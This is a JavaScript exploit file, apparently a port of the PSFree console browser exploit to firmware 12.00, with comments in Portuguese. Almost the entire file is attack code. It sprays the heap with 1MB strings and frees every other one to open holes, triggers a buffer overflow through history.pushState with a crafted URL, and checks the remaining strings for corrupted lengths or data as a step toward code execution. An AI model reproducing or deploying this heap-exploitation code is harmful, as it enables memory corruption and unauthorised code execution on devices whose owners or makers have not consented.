/* PSFree Port for FW 12.00 using History Buffer Overflow */

import { Int } from './module/int64.mjs';
import { Memory } from './module/mem.mjs';
import { KB, MB } from './module/offset.mjs';
import { BufferView } from './module/rw.mjs';
import {
    die, DieError, log, clear_log, sleep, hex, align,
} from './module/utils.mjs';
import * as config from './config.mjs';
import * as off from './module/offset.mjs';

// --- CONFIGURAÇÃO DO NOSSO BUG (FW 12.00) ---
const BASE_OFFSET = 709520; // Offset de DADOS que descobrimos
const OVERFLOW_AMT = 1024 * 64; 

// Tamanho da Vítima (1MB TextDecoder)
const TARGET_SIZE = 1024 * 1024; 
// Header estimado de string no Large Heap
const PAYLOAD_SIZE = TARGET_SIZE - 24; 

// Armazena as vítimas globalmente para não serem coletadas
var victims = [];

// ===========================================================================
// STAGE 1: HEAP SPRAY & OVERFLOW (Substitui prepare_uaf)
// ===========================================================================

async function prepare_overflow() {
    victims = [];
    log(`[STAGE 1] Preparing 1MB TextDecoder Strings...`);

    // 1. Criar a String Base (8-bit forçado)
    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
    rawBuffer.fill(0x42); // 'B'
    let decoder = new TextDecoder("utf-8");
    let baseString = decoder.decode(rawBuffer);

    // 2. Spray (80 Strings de 1MB)
    const SPRAY_COUNT = 80;
    
    for(let i=0; i<SPRAY_COUNT; i++) {
        // Prefixo para evitar deduplicação
        let s = i + "_" + baseString.substring((i+"_").length);
        victims.push(s);
    }

    // 3. Feng Shui (Buracos)
    log(`[STAGE 1] Opening Holes in Large Heap...`);
    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i] = null;
    }

    // Força GC para limpar os buracos
    await forceGC();
    
    return victims; // Retorna a lista para checagem posterior
}

// ===========================================================================
// STAGE 2: TRIGGER & CHECK (Substitui uaf_ssv)
// ===========================================================================

async function trigger_and_check() {
    log(`[STAGE 2] Triggering Overflow at offset ${BASE_OFFSET}...`);

    try {
        // Payload do Overflow
        let buffer = "A".repeat(BASE_OFFSET);
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        // Dispara
        history.pushState({}, "pwn", "/" + buffer);

        log(`[STAGE 2] Checking for corruption...`);
        
        // Checagem nas vítimas sobreviventes
        for(let i=1; i<victims.length; i+=2) {
            let s = victims[i];
            if(!s) continue;

            try {
                // TRUQUE DO ERROR (Do PSFree original)
                // Cria um Error para forçar a leitura do Heap
                let err = new Error(s);
                let msg = err.message;

                // SINAL 1: Tamanho Corrompido (JACKPOT)
                if (msg.length !== PAYLOAD_SIZE) {
                    log(`!!! SUCESSO !!! String ${i} Length: ${msg.length}`, 'green');
                    return { type: 'length', index: i, str: msg };
                }

                // SINAL 2: Conteúdo Corrompido (DADOS)
                if (msg.charCodeAt(0) !== 66) { // 'B'
                    log(`[SUCESSO PARCIAL] Dados corrompidos na String ${i}`, 'green');
                    return { type: 'data', index: i, str: msg };
                }

            } catch(e) {}
        }

    } catch(e) {
        log("Erro no Trigger: " + e.message);
    }

    return null; // Falhou
}

// ===========================================================================
// UTILITÁRIOS
// ===========================================================================

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 500));
}

// ===========================================================================
// FUNÇÃO PRINCIPAL (Ponto de Entrada)
// ===========================================================================

async function main() {
    log("=== PSFree 12.00 Port (History Overflow) ===");
    
    // Tenta rodar o exploit
    await prepare_overflow();
    const result = await trigger_and_check();

    if (result) {
        if (result.type === 'length') {
            log("PRIMITIVA RCE ALCANÇADA: Corrupção de Length!", 'green');
            log("Próximo passo: Usar esta string para ler toda a memória (AddrOf).");
            // Aqui conectaríamos com o make_arw do PSFree original
        } else {
            log("PRIMITIVA ESCRITA ALCANÇADA: Corrupção de Dados.", 'green');
            log("Ainda precisamos ajustar o offset para pegar o Length.");
        }
    } else {
        log("Falha: Nenhuma corrupção detectada. Tente reiniciar.", 'red');
    }
}

// Inicia
main();
